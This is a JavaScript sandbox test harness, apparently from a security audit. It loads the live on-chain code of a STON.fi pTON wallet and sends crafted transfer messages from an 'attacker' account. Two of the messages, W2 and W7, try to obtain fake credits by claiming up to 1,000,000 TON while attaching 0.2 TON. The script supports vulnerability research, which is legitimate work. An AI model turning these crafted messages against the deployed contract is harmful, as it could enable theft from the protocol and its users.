/**
 * pTON wallet wrap-path tests with the REAL on-chain message layout.
 * Q1: does a real-format user deposit work (credit + notify router)?
 * Q2: is the credited amount validated against the attached TON value?
 */
const { Blockchain, internal } = require("@ton/sandbox");
const { Cell, Address, beginCell, toNano, contractAddress } = require("@ton/core");
const https = require("https");
const fs = require("fs");

const PTON_WALLET = "0:1150b518b2626ad51899f98887f8824b70065456455f7fe2813f012699a4061f";
const ROUTER = "0:779dcc815138d9500e449c5291e7f12738c23d575b5310000f6a253bd607384e";

function fetchJson(url) { return new Promise((res, rej) => https.get(url, { headers: { "User-Agent": "x" } }, (r) => { let d = ""; r.on("data", c => d += c); r.on("end", () => res(JSON.parse(d))); }).on("error", rej)); }

(async () => {
  const st = await fetchJson(`https://toncenter.com/api/v3/accountStates?address=${PTON_WALLET}&include_boc=true`);
  const acc = st.accounts[0];
  const code = Cell.fromBoc(Buffer.from(acc.code_boc, "base64"))[0];
  const data = Cell.fromBoc(Buffer.from(acc.data_boc, "base64"))[0];
  const bc = await Blockchain.create();
  bc.verbosity = { logs: false, vmLogs: "none", debugLogs: false, blockchainLogs: false };
  const attacker = await bc.treasury("attacker", { balance: toNano("4000000") });
  const walletAddr = contractAddress(0, { code, data });
  await attacker.send({ to: walletAddr, value: toNano("3900000"), init: { code, data }, body: beginCell().endCell(), bounce: false });
  const A = attacker.address;

  // a plausible swap payload (op 0x25938561 + router's USDT wallet + min_out + to_address)
  const USDT_WALLET = Address.parseRaw("0:4eec921b9d4d56a0d94676016d49c26b39b1d7901a7e153e66033f146a0886f4");
  const swapPayload = beginCell()
    .storeUint(0x25938561, 32)
    .storeAddress(USDT_WALLET)
    .storeCoins(1)
    .storeAddress(A)
    .storeBit(0)
    .endCell();

  const mkBody = (amt, dest, resp, fwd, payloadRef, inlinePayload) => {
    let b = beginCell().storeUint(0xf8a7ea5, 32).storeUint(0, 64).storeCoins(amt)
      .storeAddress(dest).storeAddress(resp).storeBit(0).storeCoins(fwd);
    if (payloadRef) { b = b.storeBit(1).storeRef(payloadRef); }
    else if (inlinePayload) { b = b.storeBit(0).storeSlice(inlinePayload.beginParse()); }
    else { b = b.storeBit(0); }
    return b.endCell();
  };

  const results = [];
  async function probe(name, body, value, from) {
    let txs = [];
    try {
      const r = await bc.sendMessage(internal({ from: from || A, to: walletAddr, value, body }));
      txs = r.transactions;
    } catch (e) { results.push({ name, error: String(e).slice(0, 160) }); return; }
    const info = [];
    for (const t of txs) {
      const c = t.description.computePhase;
      const outs = [];
      for (const m of t.outMessages.values()) {
        let op = null, dest = null, val = null, b64 = null;
        try { dest = m.info.dest ? m.info.dest.toString() : null; } catch (e) {}
        try { val = m.info.value.coins.toString(); } catch (e) {}
        try { op = m.body ? "0x" + m.body.beginParse().loadUint(32).toString(16) : null; } catch (e) { op = "noparse"; }
        try { b64 = m.body ? m.body.toBoc().toString("base64") : null; } catch (e) {}
        outs.push({ dest, value: val, op, b64 });
      }
      info.push({ src: t.inMessage?.info?.src?.toString() || null, dest: t.inMessage?.info?.dest?.toString() || null,
        exit: c.type === "vm" ? c.exitCode : c.type, aborted: c.type === "vm" ? !c.success : false, outMsgs: outs });
    }
    results.push({ name, value: value.toString(), txs: info });
  }

  const R = Address.parseRaw(ROUTER);
  // Q1: exact real layout
  await probe("W1 real-format deposit 50 TON value=50.1 fwd=0.1 refPayload",
    mkBody(toNano("50"), R, A, toNano("0.1"), swapPayload), toNano("50.1"));
  // Q2: fake credit attempt — claim 50 TON but attach only 0.2 TON
  await probe("W2 FAKE claim 50 TON value=0.2 fwd=0.1",
    mkBody(toNano("50"), R, A, toNano("0.1"), swapPayload), toNano("0.2"));
  // Q3: claim 50 TON, value 50.1, but fwd=0 (no forward ton)
  await probe("W3 claim 50 TON value=50.1 fwd=0 refPayload",
    mkBody(toNano("50"), R, A, 0n, swapPayload), toNano("50.1"));
  // Q4: claim 1 TON value=1.1 inline payload (small payload to avoid cell overflow)
  const smallPayload = beginCell().storeUint(0x25938561, 32).endCell();
  await probe("W4 claim 1 TON value=1.1 fwd=0.1 inlinePayload",
    mkBody(toNano("1"), R, A, toNano("0.1"), null, smallPayload), toNano("1.1"));
  // Q5: destination = attacker (not router), claim 50, value 50.1
  await probe("W5 dest=attacker claim 50 TON value=50.1",
    mkBody(toNano("50"), A, A, toNano("0.1"), swapPayload), toNano("50.1"));
  // Q6: claim 100000 TON value 100000.1 (real full-value, sanity)
  await probe("W6 claim 100000 TON value=100000.1",
    mkBody(toNano("100000"), R, A, toNano("0.1"), swapPayload), toNano("100000.1"));
  // Q7: fake credit with a huge amount but small value (the exploit attempt)
  await probe("W7 FAKE claim 1000000 TON value=0.2",
    mkBody(toNano("1000000"), R, A, toNano("0.1"), swapPayload), toNano("0.2"));

  console.log(JSON.stringify(results, null, 1));
  fs.writeFileSync("/home/heisenberg/CA/stonfi-v1/analysis/pton_wrap_matrix.json",
    JSON.stringify({ code_hash: code.hash().toString("hex"), results }, null, 1));
})().catch(e => { console.error("FATAL", e); process.exit(1); });
